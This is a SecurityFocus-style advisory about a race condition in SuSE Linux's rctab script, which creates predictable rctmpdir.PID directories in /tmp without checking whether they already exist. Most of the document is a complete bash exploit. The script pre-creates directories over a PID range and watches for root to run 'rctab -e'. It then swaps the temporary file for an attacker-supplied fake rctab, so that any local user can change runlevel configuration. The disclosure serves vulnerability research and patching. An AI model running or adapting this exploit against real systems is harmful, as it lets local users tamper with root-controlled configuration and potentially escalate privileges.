source: http://www.securityfocus.com/bid/2207/info
 
rctab is the Run Control Tab script included with the SuSE distribution of the Linux Operating System. SuSE is a freely available, Open Source Operating system maintained by SuSE Incorporated.
 
A race condition in the rctab script could allow an attacker to either gain elevated privileges, or append to and corrupt system files. This problem exists due to the insecure creation of files in the /tmp directory by the rctab script. Upon execution of the rctab script, rctab creates a subdirectory in the /tmp directory, using directory name rctmpdir.[pid of rctab process]. The script, which is normally run by root, does not check for an already existing rctmpdir.[pid of rctab process] directory. Additionally, the use of the -p flag with mkdir does not generate an error when the directory already exists, allowing the script to continue executing.
 
This problem makes it possible for a malicious user to guess the future process id of the rctab process, and create a range of directories that either will overwrite system files, or append to other system files and potentially allow elevation of privileges. 

#!/bin/bash
#       any user can force changes to runlevels
#       by IhaQueR

declare -i PLOW
declare -i PHIGH


# CONFIG:

PLOW=1
PHIGH=3

TMP="/tmp"
FAKERC="/tmp/fakerc"
RCTMPDIR="rctmpdir"
RCTMP="rctmp"

_pwd="$PWD"

#
echo "----------------------------------------------"
echo "|                                            |"
echo "|             rctab exploit                  |"
echo "|            by IhaQueR '2001                |"
echo "|                                            |"
echo "----------------------------------------------"
echo

# crate dirs
echo "[+] now creating directories"
echo "    this may take a while"
echo

declare -i cnt
cnt=$PLOW
umask 700

while [ $cnt -lt $PHIGH ]
do
        cnt=$(($cnt+1))
        if [ $(($cnt % 128)) -eq 0 ] ; then
                printf "[%6d] " $cnt
        fi;
        if [ $(($cnt % 1024)) -eq 0 ] ; then
                echo
        fi;
        mkdir -p "$TMP/$RCTMPDIR.$cnt"
done

echo
echo
echo "    finished creating dirs"
echo

# wait for rctab -e
declare -i rctabpid
rctabpid=0
echo "[+] waiting for root to run rctab"

while [ 1 ]
do
        rctabpid=`ps aux|grep "rctab -e"|grep root|head -n1|awk '{print $2}'`
        if test $rctabpid -gt 1 ; then
                break
        fi
        sleep 1
done

# rcfile in
rcfile="/tmp/rctmpdir.$rctabpid/$RCTMP"

echo "[+] got rctab -e at pid $rctabpid"

# test if we own the directory
rcdir="/tmp/rctmpdir.$rctabpid"

if test -O $rcdir ; then
        echo "[+] ok, we own the dir"
else
        echo "[-] hm, we are not owner"
        exit 2
fi

# wait for root to finish editing
sleep 4
declare -i vipid
vipid=`ps aux|grep rctmpdir|grep root|awk '{print $2}'`

echo "    root is editing now at $vipid, wait for $rcfile"

pfile="/proc/$vipid"

while test -d $pfile
do
        echo -n >/dev/null
done
rm -rf $rcfile
cp $FAKERC $rcfile

echo "[+] gotcha!"
echo "    installed new rctab from $FAKERC"
